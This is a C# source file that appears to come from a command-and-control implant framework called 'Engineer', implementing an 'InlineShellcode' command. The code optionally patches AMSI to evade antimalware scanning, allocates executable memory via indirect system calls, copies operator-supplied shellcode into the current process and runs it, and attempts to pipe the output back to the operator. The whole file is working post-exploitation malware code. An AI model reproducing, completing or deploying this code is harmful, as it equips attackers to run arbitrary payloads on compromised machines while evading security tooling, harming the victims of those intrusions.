using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Runtime.Remoting.Messaging;
using System.Threading;
using System.IO.Pipes;
using static Engineer.Extra.h_reprobate.Win32;
using static Engineer.Extra.WinAPIs;
using static Engineer.Extra.WinAPIs.Kernel32;
using Microsoft.Win32.SafeHandles;
using static System.Net.WebRequestMethods;
using Engineer.Functions;

namespace Engineer.Commands
{
    // goal was to allow self injection of shellcode and return the output to the C2 but nothing I do will redirect the shellcodes output away from the console. 
    internal class ShellcodeSelf : EngineerCommand
    {
        public override string Name => "InlineShellcode";
        public string output;
        public static MemoryStream Ms = new MemoryStream();
        public static StreamWriter writer = new StreamWriter(Ms);
        public delegate void ShellcodeDelegate(string[] output);

        public override async Task Execute(EngineerTask task)
        {
            // use Console.SetOut() to redirect the output to the TextWriter

            var stdOut = Console.Out;
            var stdErr = Console.Error;

            //get main thread of current process
            Process currentProcess = Process.GetCurrentProcess();

            task.Arguments.TryGetValue("/args", out string arg);
            string[] args = arg.Split(' ');

            byte[] shellcode = task.File;
            int shellcodeLength = shellcode.Length;

            WinAPIs.Kernel32.SECURITY_ATTRIBUTES saAttr = new WinAPIs.Kernel32.SECURITY_ATTRIBUTES();
            // Set the bInheritHandle flag so pipe handles are inherited. 

            saAttr.nLength = Marshal.SizeOf(saAttr);
            saAttr.bInheritHandle = false;
            saAttr.lpSecurityDescriptor = IntPtr.Zero;

            //create a named pipe and use it to set Console.Out and Console.Error
           var pipeHandle = WinAPIs.Kernel32.CreateNamedPipe(
                "\\\\.\\pipe\\EngineerPipe",
                WinAPIs.Kernel32.PipeOpenModeFlags.PIPE_ACCESS_DUPLEX, WinAPIs.Kernel32.PipeModeFlags.PIPE_TYPE_BYTE | WinAPIs.Kernel32.PipeModeFlags.PIPE_READMODE_BYTE | WinAPIs.Kernel32.PipeModeFlags.PIPE_WAIT,1, 65535, 65535, 0, ref saAttr);
           

            //use create file api call in the new named pipe address
            var pipeHandle2 = WinAPIs.Kernel32.CreateFile(
                "\\\\.\\pipe\\EngineerPipe",
                WinAPIs.Kernel32.EFileAccess.GenericRead | WinAPIs.Kernel32.EFileAccess.GenericWrite,
                WinAPIs.Kernel32.EFileShare.Read | WinAPIs.Kernel32.EFileShare.Write,
                IntPtr.Zero,
                WinAPIs.Kernel32.ECreationDisposition.OpenExisting,
                WinAPIs.Kernel32.EFileAttributes.Normal,
                IntPtr.Zero);

            //cAll set std handle to update the console out to use our new pipeHandle2
           bool setHadnleSuccess = WinAPIs.Kernel32.SetStdHandle(WinAPIs.Kernel32.STD_OUTPUT_HANDLE, pipeHandle2);

            // Console.SetOut(new StreamWriter(new FileStream(fileSafeHandle, FileAccess.Write)));
            //Console.SetError(new StreamWriter(new FileStream(fileSafeHandle, FileAccess.Write)));

            //check if the console out and console error got updated
            if (!setHadnleSuccess)
            {
                //Console.WriteLine("Failed to redirect output");
                Tasking.FillTaskResults("Failed to redirect output", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                return;
            }

            try
            {
                //Console.WriteLine("[+] Patching amsi");
                task.Arguments.TryGetValue("/patchA", out string patch);
                bool.TryParse(patch,out bool isPatching);
                if (isPatching)
                {
                    Tasking.FillTaskResults("patching", task, EngTaskStatus.Running, TaskResponseType.String);
                    Patch_AMSI patchobject = new Patch_AMSI();
                    patchobject.Execute(null);
                }

                //use reprobate to call virtualalloc
                var hMemory = IntPtr.Zero;
                IntPtr shellLengthPointer = (IntPtr)shellcodeLength;
                IntPtr MemoryShell = h_reprobate.NtAllocateVirtualMemory(currentProcess.Handle, ref hMemory, IntPtr.Zero, ref shellLengthPointer, h_reprobate.Win32.Kernel32.AllocationType.Commit, WinAPIs.Kernel32.PAGE_EXECUTE_READWRITE);

                Marshal.Copy(shellcode, 0, MemoryShell, shellcode.Length);

                ShellcodeDelegate Run = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(MemoryShell, typeof(ShellcodeDelegate));
                Run(args);
                //Read from named pipe in chunks until there is no more data to read
                byte[] buffer = new byte[65535];
                
                uint bytesRead = 0;
               // Console.WriteLine("reading from pipe");
                var success = WinAPIs.Kernel32.ReadFile(pipeHandle, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero);
                //Console.WriteLine($"read {bytesRead} bytes");
                output = Encoding.UTF8.GetString(buffer, 0, buffer.Length);
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
            }
            finally
            {
                //reset the console out and error
                Console.SetOut(stdOut);
                Console.SetError(stdErr);
            }

            Tasking.FillTaskResults(output, task, EngTaskStatus.Complete,TaskResponseType.String);
        }
    }
}
